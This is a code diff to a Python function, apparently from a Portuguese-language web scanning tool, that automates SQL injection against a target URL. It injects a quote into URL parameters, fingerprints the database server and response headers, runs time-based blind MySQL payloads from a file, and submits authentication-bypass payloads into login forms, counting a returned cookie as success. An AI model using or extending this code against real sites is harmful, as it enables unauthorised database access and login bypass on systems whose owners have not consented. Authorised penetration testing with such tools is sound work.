@@ -30,6 +30,7 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
             from core.config import AVARAGE_TIME_BASED_SQLI
             from core.config import DEFAULT_SQLI_TIME_BASED_TIME
             from core.config import SQLI_BLIND_TIME_BASED_SUCCED_COUNT
+            from core.config import FIND_NUMBER_OF_COLLUM_IN_TABLE
             from bs4 import BeautifulSoup
             from core.utils import urlExplode
             from mode.plugin.dbfingerprint import _dbFingerprint
@@ -64,39 +65,38 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                 print("["+color.green+"+"+color.end+"] Procurando por variáveis URL...", end='') 
                 para = re.compile('(=)\w+')
                 if para.search(target_url):
-                        splited_para = para.search(target_url).group()
-                        exploited_target_url = target_url.replace(splited_para, splited_para+"'")
-                        requesicao = requests.head(url=exploited_target_url)
-                        
-                        '''
-                            fazendo um fingerprint no servidor
-                        '''
-                        current_table_cullumns_number = _dbFingerprint(target_url)
-                        print("\n", _serverVersion(target_url, current_table_cullumns_number))
-                        print("\n ----------")
-                        header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Contry-Code', 'Sec-Ch-Ua-Platform']
-                        for header_perc in header_list:
-                            try:
-                                result = requesicao.headers[header_perc]
-                                print("\t%s: %s  " % (header_perc, result))
-                            except Exception as error:
-                                print("\t%s : não encontrado" % header_perc)
-                        print("\tQuantidade de colunas na tabela actual: %s "%current_table_cullumns_number)
-                        print(" ----------")
-                    
-                        print("["+color.green+"+"+color.end+"] Identificando o SGBD com "+color.cian+" SQLI INFERENCIAL(CEGA)"+color.end)
-                        
                         try:
+                            ## tentando extrai informaçẽs do servidor com socket
+                            splited_para = para.search(target_url).group()
+                            exploited_target_url = target_url.replace(splited_para, splited_para+"'")
+                            requesicao = requests.head(url=exploited_target_url)
                             requesicao = requests.post(url=exploited_target_url)
                             
-                            ## estou trabalhando aqui
-                            ## pensando em como extrair informações do servidor, endereço dns, ip, e muito mais.....
-                            
-                            ## tentando extrai informaçẽs do servidor com socket
-                                
-                            
+                            '''
+                                fazendo um fingerprint no servidor
+                            '''
+                            current_table_cullumns_number = _dbFingerprint(target_url)
+                            server_fingerprint = _serverVersion(target_url, current_table_cullumns_number)
+                            print("\n["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) ORDER QUERY TECHNIQUE..."+FIND_NUMBER_OF_COLLUM_IN_TABLE+color.end)
+                            print("["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) FINGERPRINT TECHINQUE... "+color.end,end='')
+                           
+                            print("\n["+color.green+"+"+color.end+"] Identificando o SGBD com "+color.cian+" SQLI INFERENCIAL(CEGA)"+color.end)
                             if 'mysql' in requesicao.text.lower():
-                                print("["+color.green+"*"+color.end+"] SGBD identificado: "+color.cian+"[MYSQL]"+color.end)
+                                ## mostra o relatório em relação ao fingerprint do servidor
+                                print("\n ----------")
+                                header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Contry-Code', 'Sec-Ch-Ua-Platform']
+                                for header_perc in header_list:
+                                    try:
+                                        result = requesicao.headers[header_perc]
+                                        print("\t%s: %s  " % (header_perc, result))
+                                    except Exception as error:
+                                        print("\t%s : não encontrado" % header_perc)
+                                print("\tSGBD alvo: MYSQL")        
+                                print("\tVersão do SGBD: %s" %server_fingerprint[1])
+                                print("\tSistema backand do SGBD: %s" %server_fingerprint[2])
+                                print("\tQuantidade de colunas na tabela actual: %s "%current_table_cullumns_number)
+                                print(" ----------")
+                                ## termino do relatório
                                 print("["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
                                 with open('./mode/payload/mysql/blind_payloads_time_based', 'r') as blind_time_based_sqli:
                                     for lines in blind_time_based_sqli:
@@ -137,15 +137,13 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                 print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+" SGBD não encontrada, o alvo deve estar sendo protegido por mecanismos de segurança, tal como WAF."+color.end, end='')
                                 user_option = str(input(' Deseja continuar o teste? (sim/nao):'))
                                 if user_option.lower() == 'sim':
-                                    ## continua o scaneamento 
-                                    pass
+                                    pass ## continua o scaneamento fazendo outros testes aqui
                                 elif user_option.lower() == 'nao':
                                     print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+" saindo do web spider..."+color.end)
                                     quit()
                                 else:
                                     print(color.info_1+color.red_0+color.info_2+" Erro: "+color.orange+" Opção inválida, saindo do web spider..."+color.end)
                                     quit()
-                                    ## como verificar que a injeção teve sucesso???
                         except FileNotFoundError as e:
                             e = str(e)
                             print(color.info_1+color.red_0+color.info_2+" Erro: arquivo "+color.red, e[38:],color.orange+" não foi encontrado"+color.end)
@@ -170,7 +168,7 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                     succed_payloads = []
                     url_exploded = urlExplode(target_url)
                     
-                    ## percorre o objeccto Soup do formulário, guardando ele no array_form com índices inteiros
+                    ## percorre o objecto Soup do formulário, guardando ele no array_form com índices inteiros
                     for form_perc in forms:
                         form_quant +=1
                         if 'action' in form_perc.attrs:
@@ -207,13 +205,13 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                                 elif 'name' in input_tag_perc.attrs:
                                                     input_dic[input_tag_perc.attrs['name']] = lines
                                         main_requesition = requests.post(url=post_target_url, data=input_dic)
-                                        if 'Set-Cookie' in main_requesition.headers:
+                                        if 'Set-Cookie' in main_requesition.headers: ## pensar bem nessa línha 
                                             print("["+color.green+"+"+color.end+"] ["+color.green+"Viável"+color.end+"]    MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
                                             succed_payloads.append(lines)
                                         else:
                                             print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
                                 '''
-                                secção de relatório de teste
+                                secção de relatórios de teste
                                 '''          
                                 print("\n O Web spider detetou os seguintes pontos de injeção no alvo:")
                                 for succed_payloads_lines in succed_payloads:
